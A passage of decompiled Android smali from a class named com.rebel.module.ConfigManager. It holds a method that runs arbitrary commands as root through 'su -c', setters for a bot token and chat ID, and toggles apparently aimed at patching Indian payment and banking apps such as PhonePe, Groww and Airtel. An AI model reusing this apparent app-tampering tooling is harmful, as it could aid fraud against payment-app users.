        -0x17a09fcf -> :sswitch_13
        -0x175eb168 -> :sswitch_12
        -0x15fd35b8 -> :sswitch_11
        -0xc47ac25 -> :sswitch_10
        -0x8c487fd -> :sswitch_f
        0x1eb2f65 -> :sswitch_e
        0x12454048 -> :sswitch_d
        0x2288c21a -> :sswitch_c
        0x23d4e9fb -> :sswitch_b
        0x25b80531 -> :sswitch_a
        0x2c0dff62 -> :sswitch_9
        0x417a9151 -> :sswitch_8
        0x48dbc918 -> :sswitch_7
        0x49284d91 -> :sswitch_6
        0x4f74291d -> :sswitch_5
        0x4f98fefb -> :sswitch_4
        0x4fc14f04 -> :sswitch_3
        0x6cde6b47 -> :sswitch_2
        0x6ddae981 -> :sswitch_1
        0x6e63f5b9 -> :sswitch_0
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_27
        :pswitch_26
        :pswitch_25
        :pswitch_24
        :pswitch_23
        :pswitch_22
        :pswitch_21
        :pswitch_20
        :pswitch_1f
        :pswitch_1e
        :pswitch_1d
        :pswitch_1c
        :pswitch_1b
        :pswitch_1a
        :pswitch_19
        :pswitch_18
        :pswitch_17
        :pswitch_16
        :pswitch_15
        :pswitch_14
        :pswitch_13
        :pswitch_12
        :pswitch_11
        :pswitch_10
        :pswitch_f
        :pswitch_e
        :pswitch_d
        :pswitch_c
        :pswitch_b
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method public final runAsRoot(Ljava/lang/String;)Z
    .locals 9
    .param p1, "str"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 697
    const/4 v0, 0x0

    .line 698
    .local v0, "processExec":Ljava/lang/Process;
    const/4 v1, 0x0

    .line 699
    .local v1, "bufferedReader":Ljava/io/BufferedReader;
    const/4 v2, 0x0

    .line 702
    .local v2, "bufferedReader2":Ljava/io/BufferedReader;
    const/4 v3, 0x0

    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v4

    const/4 v5, 0x3

    new-array v5, v5, [Ljava/lang/String;

    const-string v6, "su"

    aput-object v6, v5, v3

    const-string v6, "-c"

    const/4 v7, 0x1

    aput-object v6, v5, v7

    const/4 v6, 0x2

    aput-object p1, v5, v6

    invoke-virtual {v4, v5}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v4

    move-object v0, v4

    .line 703
    new-instance v4, Ljava/io/BufferedReader;

    new-instance v5, Ljava/io/InputStreamReader;

    invoke-virtual {v0}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v4, v5}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    move-object v1, v4

    .line 704
    new-instance v4, Ljava/io/BufferedReader;

    new-instance v5, Ljava/io/InputStreamReader;

    invoke-virtual {v0}, Ljava/lang/Process;->getErrorStream()Ljava/io/InputStream;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v4, v5}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    move-object v2, v4

    .line 705
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    .line 706
    .local v4, "sb":Ljava/lang/StringBuilder;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 708
    .local v5, "sb2":Ljava/lang/StringBuilder;
    :goto_0
    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v6

    .line 709
    .local v6, "line":Ljava/lang/String;
    const/16 v8, 0xa

    if-nez v6, :cond_2

    .line 710
    nop

    .line 716
    .end local v6    # "line":Ljava/lang/String;
    :goto_1
    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v6

    .line 717
    .local v6, "line2":Ljava/lang/String;
    if-nez v6, :cond_1

    .line 718
    nop

    .line 723
    .end local v6    # "line2":Ljava/lang/String;
    invoke-virtual {v0}, Ljava/lang/Process;->waitFor()I

    move-result v6

    .line 724
    .local v6, "iWaitFor":I
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->length()I

    .line 728
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->length()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    .line 732
    if-nez v6, :cond_0

    goto :goto_2

    :cond_0
    move v7, v3

    .line 734
    .local v7, "z":Z
    :goto_2
    :try_start_1
    invoke-virtual {v1}, Ljava/io/BufferedReader;->close()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 736
    goto :goto_3

    .line 735
    :catch_0
    move-exception v8

    .line 738
    :goto_3
    :try_start_2
    invoke-virtual {v2}, Ljava/io/BufferedReader;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 740
    goto :goto_4

    .line 739
    :catch_1
    move-exception v8

    .line 741
    :goto_4
    :try_start_3
    invoke-virtual {v0}, Ljava/lang/Process;->destroy()V

    .line 742
    return v7

    .line 720
    .end local v7    # "z":Z
    .local v6, "line2":Ljava/lang/String;
    :cond_1
    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 721
    invoke-virtual {v5, v8}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 722
    nop

    .end local v6    # "line2":Ljava/lang/String;
    goto :goto_1

    .line 712
    .local v6, "line":Ljava/lang/String;
    :cond_2
    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 713
    invoke-virtual {v4, v8}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    .line 714
    nop

    .end local v6    # "line":Ljava/lang/String;
    goto :goto_0

    .line 743
    .end local v4    # "sb":Ljava/lang/StringBuilder;
    .end local v5    # "sb2":Ljava/lang/StringBuilder;
    :catch_2
    move-exception v4

    .line 746
    .local v4, "e3":Ljava/lang/Exception;
    if-eqz v1, :cond_3

    .line 748
    :try_start_4
    invoke-virtual {v1}, Ljava/io/BufferedReader;->close()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    .line 750
    goto :goto_5

    .line 749
    :catch_3
    move-exception v5

    .line 752
    :cond_3
    :goto_5
    if-eqz v2, :cond_4

    .line 754
    :try_start_5
    invoke-virtual {v2}, Ljava/io/BufferedReader;->close()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_4

    .line 756
    goto :goto_6

    .line 755
    :catch_4
    move-exception v5

    .line 758
    :cond_4
    :goto_6
    if-eqz v0, :cond_5

    .line 759
    invoke-virtual {v0}, Ljava/lang/Process;->destroy()V

    .line 761
    :cond_5
    return v3
.end method

.method public setBotToken(Ljava/lang/String;)V
    .locals 2
    .param p1, "str"    # Ljava/lang/String;

    .line 768
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 770
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 771
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    if-eqz p1, :cond_0

    move-object v1, p1

    goto :goto_0

    :cond_0
    const-string v1, ""

    :goto_0
    iput-object v1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->bot_token:Ljava/lang/String;

    .line 772
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 774
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 775
    nop

    .line 776
    return-void

    .line 774
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 775
    throw v0
.end method

.method public setChatId(Ljava/lang/String;)V
    .locals 2
    .param p1, "str"    # Ljava/lang/String;

    .line 779
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 781
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 782
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    if-eqz p1, :cond_0

    move-object v1, p1

    goto :goto_0

    :cond_0
    const-string v1, ""

    :goto_0
    iput-object v1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->chat_id:Ljava/lang/String;

    .line 783
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 785
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 786
    nop

    .line 787
    return-void

    .line 785
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 786
    throw v0
.end method

.method public setFixAirtelEnabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 431
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 433
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 434
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->fix_airtel:Z

    .line 435
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 437
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 438
    nop

    .line 439
    return-void

    .line 437
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 438
    throw v0
.end method

.method public setFixEsafEnabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 386
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 388
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 389
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->fix_esaf:Z

    .line 390
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 392
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 393
    nop

    .line 394
    return-void

    .line 392
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 393
    throw v0
.end method

.method public setFixEsafNativeEnabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 401
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 403
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 404
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->fix_esaf_native:Z

    .line 405
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 407
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 408
    nop

    .line 409
    return-void

    .line 407
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 408
    throw v0
.end method

.method public setFixGrowwEnabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 442
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 444
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 445
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->fix_groww:Z

    .line 446
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 448
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 449
    nop

    .line 450
    return-void

    .line 448
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 449
    throw v0
.end method

.method public setFixNaviEnabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 306
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 308
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 309
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->fix_navi:Z

    .line 310
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 312
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 313
    nop

    .line 314
    return-void

    .line 312
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 313
    throw v0
.end method

.method public setFixPhonePeEnabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 509
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 511
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 512
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->fix_phonepe:Z

    .line 513
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 515
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 516
    nop

    .line 517
    return-void

    .line 515
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 516
    throw v0
.end method

.method public setFixZaggEnabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 416
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 418
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 419
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->fix_zagg:Z

    .line 420
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 422
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 423
    nop

    .line 424
    return-void

    .line 422
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 423
    throw v0
.end method

.method public setFixZetEnabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 329
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 331
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 332
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->fix_zet:Z

    .line 333
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 335
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 336
    nop

    .line 337
    return-void

    .line 335
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 336
    throw v0
.end method

.method public setGmsSenderEnabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 790
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 792
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 793
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
